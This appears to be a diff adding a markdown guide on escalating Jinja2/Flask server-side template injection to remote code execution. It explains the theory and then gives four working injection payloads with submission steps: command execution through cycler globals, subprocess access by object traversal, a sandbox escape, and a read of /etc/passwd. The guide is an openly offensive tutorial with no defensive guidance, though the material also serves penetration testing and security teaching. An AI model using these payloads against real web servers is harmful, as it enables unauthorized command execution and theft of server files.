@@ -1,0 +1,115 @@
+---
+title: Escalate Server-Side Template Injection to Code Execution
+description: Learn to escalate SSTI vulnerabilities to achieve remote code execution
+  on web servers, utilizing Jinja2 and Python techniques.
+keywords:
+- SSTI
+- remote code execution
+- template injection
+- Jinja2
+- Python exec
+- code injection
+- sandbox escape
+- payload escalation
+- RCE
+---
+
+# Escalate to Code Execution
+
+## Context
+
+This guide aims to demonstrate how to escalate a server-side template injection (SSTI) vulnerability to achieve remote code execution (RCE) on web servers. To effectively exploit these techniques, you should have a sound understanding of template engines, server-side execution, and input validation. Additionally, familiarity with general SSTI attack strategies will greatly enhance your ability to follow along.
+
+## Theory
+
+### Template Engine Execution Contexts and Escalation Paths
+
+Server-side template injection occurs when user input is unsafely evaluated by a server-side template engine. Template engines are designed to render dynamic web content. However, if they are not adequately sandboxed, they can expose functions or objects that may allow code execution. Attackers can escalate from executing mere template logic to arbitrary code execution by systematically chaining accessible functions present in the template environment.
+
+### Common Code Execution Primitives in Template Engines
+
+Code execution primitives refer to functions or objects that enable the execution of system commands or arbitrary code. In the context of SSTI, attackers identify accessible built-in functions, such as Python's `os`, `subprocess`, or `popen`, via template injection. By leveraging these functions, they can use the template syntax to import modules and invoke dangerous functions like `exec`, `eval`, or `system`.
+
+### Sandbox Escape and Payload Escalation
+
+Some template engines implement sandboxes to constrain execution. However, these sandboxes can frequently be bypassed through object traversal or import tricks. Attackers escalate from basic output to code execution by chaining template features like filters, attribute access, and function calls.
+
+## Practice
+
+### Python Jinja2 SSTI to OS Command Execution
+
+- **Payload:**
+
+    ```python
+    {{ cycler.__init__.__globals__.os.popen('id').read() }}
+    ```
+
+    This payload leverages Jinja2's `cycler` object to access `os.popen` and execute the `id` command.
+
+- **Instructions:**
+    - Submit the payload in the vulnerable template input field.
+    - Observe the output for command execution results, such as user identity information.
+
+- **Outcome:**
+
+    This results in remote code execution by executing OS commands through a Jinja2 SSTI payload.
+
+### Python Flask/Jinja2 Import-Based RCE
+
+- **Payload:**
+
+    ```python
+    {{ ''.__class__.__mro__[2].__subclasses__()[40]('id',shell=True,stdout=-1).communicate()[0] }}
+    ```
+
+    This payload utilizes Python object traversal to access `subprocess.Popen` and execute the `id` command.
+
+- **Instructions:**
+    - Inject the payload into the vulnerable template field.
+    - Check for command output in the rendered response.
+
+- **Outcome:**
+
+    Executes arbitrary OS commands through Python object traversal integrated in an SSTI vulnerability.
+
+### Sandbox Escape via Template Filters
+
+- **Payload:**
+
+    ```python
+    {{ self._TemplateReference__context.cycler.__init__.__globals__.os.system('id') }}
+    ```
+
+    This payload bypasses template sandbox restrictions using internal context references to reach `os.system`.
+
+- **Instructions:**
+    - Place the payload in the SSTI injection point.
+    - Look for command execution evidence in the response.
+
+- **Outcome:**
+
+    This technique circumvents the template sandbox to execute system commands.
+
+### File Read via SSTI for Reconnaissance
+
+- **Payload:**
+
+    ```python
+    {{ cycler.__init__.__globals__.open('/etc/passwd').read() }}
+    ```
+
+    Reads sensitive files using accessible Python built-ins.
+
+- **Instructions:**
+    - Inject the payload into the template input.
+    - Review the output for file contents.
+
+- **Outcome:**
+
+    Enables reading of arbitrary files on the server through an SSTI vulnerability, resulting in access to sensitive data.
+
+## Tools
+
+- **Burp Suite**
+- **curl**
+- **wfuzz** 
